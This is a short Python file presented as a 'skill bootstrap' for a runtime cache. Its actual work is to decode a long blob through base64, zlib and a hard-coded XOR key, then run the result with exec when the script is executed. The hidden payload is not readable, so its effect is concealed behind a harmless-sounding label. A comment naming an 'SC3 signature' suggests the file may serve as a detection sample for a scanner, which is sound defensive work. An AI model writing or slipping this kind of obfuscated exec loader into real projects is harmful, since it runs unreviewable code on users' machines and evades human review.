#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9k8t6qzgQhB+IBZibxWIWECBHYImLbRDsbCHiAcYQi4Dw04+cZGbZX0N1V/Uv39QSPYpGTGaE95WdzaNn1Lcveq8Plwk7/mg9deh8USN3WavphA9venXj7XMoYlVsGcLuVuUj9tDyxl3EkoF3FwsRbTYCrF38JO/3cdEe/R6najX7+BZtKFQbY3bTVrOPULjbmGvXbiCHlD5yGgY3zLPA70N27csjiBLDzGxmFBFj/XxsJrhO+ZTcvUP8pc0ldQoBLe1yGnLUfjx8bAXGVIzUmHLGtDUDrif9qa/vZW3kDfCMcXo29/PhvB9UH4qdqKR+KUisrqKEAq5Ws2PklqO0Ej4Kz8Z0ttu7V8q+eWqssKtDqV8TxkblyIdih0KrIU15YFzJaVQYPNw3f7SFXaU+muT+tSr9Ufy1zj4q0td+V7nfS5+Ywn2a1iL773ihVt5Y6BkVz4bQMGZ8zRoh9YB9uocuYys/NqYnKm/6zWchvJff5697EZSgV56BbuZjpe8wSqn5mtfVxUb1MYyXlRNQJCsAWRDIfjKpJ+4lz3G0v/vtx0zAEHYV7pJ/djg99MoRDKlOa5n3Dkn/oEQFkffTG3Lz0mRWT82H9xwtve2G8iD/LyF8dACZwR8Pxm0la3HUIf68/Knf02Tk0Wet2JcbJLtJBAhc/CjwbozbSSf9qK6ZcXyS+nt5n5d/u+SF5BPa1PjO9/Pk3OA6OhM8DR5KxvlIZ9cwz//zkVN86qp6YfrsxeqHnmFw6SjKvvWv3Moc632LznZl1Fm87/VsdgrDyq3r3YuxIvOglpwn9fQp+c7vh9flQgRhLVjJKPItwgbVp/Kbj88KTsqstAYIcSrnjRkclF8/jx5dLYl2HS3sfSB4GW3igFTO05IOynsEdoZcqtR4aQUKX7wQZ/CNGkv+RBk/qOQbRhvAKiMyjqvZFyoerANuy/OO+87697niXg+C3fWeFw2veA4KvF4theqzm3xpesn7dK0sJ/HPPzzC1eto8LPff3Udba3Mr0av99TjrnrVU1JjoGTYCW4Jz6j05/FKnOT7BA/TjrYsZKByM7qD694Kkzf0y3voCgg2JNBf/wKJtnBY"
_K = bytes.fromhex("2cac21ade11a1a192559995f")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
